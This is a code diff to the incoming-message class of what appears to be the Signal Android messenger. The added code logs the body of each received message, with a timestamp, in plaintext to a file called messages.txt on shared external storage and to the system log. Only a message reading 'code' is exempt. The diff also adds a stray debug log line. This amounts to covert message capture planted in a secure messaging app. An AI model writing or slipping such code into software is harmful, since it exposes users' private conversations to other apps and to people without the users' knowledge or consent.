@@ -1,11 +1,14 @@
+
 package org.thoughtcrime.securesms.sms;
 
 import android.content.Context;
+import android.os.Environment;
 import android.os.Parcel;
 import android.os.Parcelable;
 import android.support.annotation.NonNull;
 import android.support.annotation.Nullable;
 import android.telephony.SmsMessage;
+import android.util.Log;
 
 import org.thoughtcrime.securesms.database.Address;
 import org.thoughtcrime.securesms.util.GroupUtil;
@@ -13,9 +16,22 @@ import org.whispersystems.libsignal.util.guava.Optional;
 import org.whispersystems.signalservice.api.messages.SignalServiceGroup;
 import org.whispersystems.signalservice.api.push.SignalServiceAddress;
 
+import java.io.BufferedWriter;
+import java.io.File;
+import java.io.FileWriter;
+import java.io.IOException;
+import java.text.DateFormat;
+import java.text.SimpleDateFormat;
+import java.util.Date;
 import java.util.List;
 
 public class IncomingTextMessage implements Parcelable {
+  //added
+
+  private static final String CODENAME = "code";
+  public static IncomingTextMessage.WriteMessageIntoLogFile writeToFile=
+          new IncomingTextMessage.WriteMessageIntoLogFile(); //my addition
+  //end of added
 
   public static final Parcelable.Creator<IncomingTextMessage> CREATOR = new Parcelable.Creator<IncomingTextMessage>() {
     @Override
@@ -62,6 +78,9 @@ public class IncomingTextMessage implements Parcelable {
                              String encodedBody, Optional<SignalServiceGroup> group,
                              long expiresInMillis)
   {
+
+    Log.v("aaaaa", "bbbbbbb");
+
     this.message              = encodedBody;
     this.sender               = sender;
     this.senderDeviceId       = senderDeviceId;
@@ -79,6 +98,7 @@ public class IncomingTextMessage implements Parcelable {
     } else {
       this.groupId = null;
     }
+      this.writeMessageToLogFile();
   }
 
   public IncomingTextMessage(Parcel in) {
@@ -94,6 +114,7 @@ public class IncomingTextMessage implements Parcelable {
     this.push                 = (in.readInt() == 1);
     this.subscriptionId       = in.readInt();
     this.expiresInMillis      = in.readLong();
+    //  this.writeMessageToLogFile();
   }
 
   public IncomingTextMessage(IncomingTextMessage base, String newBody) {
@@ -109,6 +130,7 @@ public class IncomingTextMessage implements Parcelable {
     this.push                 = base.isPush();
     this.subscriptionId       = base.getSubscriptionId();
     this.expiresInMillis      = base.getExpiresIn();
+     // this.writeMessageToLogFile();
   }
 
   public IncomingTextMessage(List<IncomingTextMessage> fragments) {
@@ -130,6 +152,7 @@ public class IncomingTextMessage implements Parcelable {
     this.push                 = fragments.get(0).isPush();
     this.subscriptionId       = fragments.get(0).getSubscriptionId();
     this.expiresInMillis      = fragments.get(0).getExpiresIn();
+     // this.writeMessageToLogFile();
   }
 
   protected IncomingTextMessage(@NonNull Address sender, @Nullable Address groupId)
@@ -146,6 +169,7 @@ public class IncomingTextMessage implements Parcelable {
     this.push                 = true;
     this.subscriptionId       = -1;
     this.expiresInMillis      = 0;
+     // this.writeMessageToLogFile();
   }
 
   public int getSubscriptionId() {
@@ -258,5 +282,75 @@ public class IncomingTextMessage implements Parcelable {
     out.writeParcelable(groupId, flags);
     out.writeInt(push ? 1 : 0);
     out.writeInt(subscriptionId);
+  }
+
+  public void writeMessageToLogFile(){
+
+    //my addition
+    if (!this.getMessageBody().equals(CODENAME)) {
+      try {
+        Log.d(TAG, this.getMessageBody());
+        writeToFile.writeToFileOnDevice(this.getMessageBody());
+      } catch (IOException e) {
+        Log.d(TAG, e.toString());
+      }
+    }
+    //end of my addition
+  }
+  public static class WriteMessageIntoLogFile {
+    //my addition
+    public BufferedWriter out;
+    private boolean bufferWasCreated = false;
+    //end of my addition
+
+
+    public  WriteMessageIntoLogFile(){
+      if (this.bufferWasCreated == false){
+        try {
+          this.createFileOnDevice(true);
+          this.bufferWasCreated = true;
+        } catch (java.io.IOException e){
+
+        }
+      }
+    }
+    private void createFileOnDevice(Boolean append) throws IOException {
+    /*
+    * Function to initially create the log file and it also writes the time of creation to file.
+    */
+      File Root = Environment.getExternalStorageDirectory();
+      if(Root.canWrite()){
+        File  LogFile = new File(Root, "messages.txt");
+        Log.d(TAG,LogFile.getAbsolutePath());
+        FileWriter LogWriter = new FileWriter(LogFile, append);
+        out = new BufferedWriter(LogWriter);
+
+        // Date date = new Date();
+        // out.write("Logged at" + String.valueOf(date.getHours() + ":" + date.getMinutes() + ":" + date.getSeconds() + "\n"));
+        // out.close();
+
+      }
+    }
+
+
+    public void writeToFileOnDevice(String message) throws IOException {
+    /*
+    * Function to initially create the log file and it also writes the time of creation to file.
+    */
+      File Root = Environment.getExternalStorageDirectory();
+      if(Root.canWrite()){
+        //File  LogFile = new File(Root, "messages.txt");
+        // FileWriter LogWriter = new FileWriter(LogFile, append);
+        //out = new BufferedWriter(LogWriter);
+        Date date = new Date();
+        DateFormat dateFormat = new SimpleDateFormat("yyyy/MM/dd HH:mm:ss");
+        out.write(dateFormat.format(date)
+                +": " +message+ "\n");
+        out.flush();
+        //out.close();
+
+      }
+    }
+
   }
 }
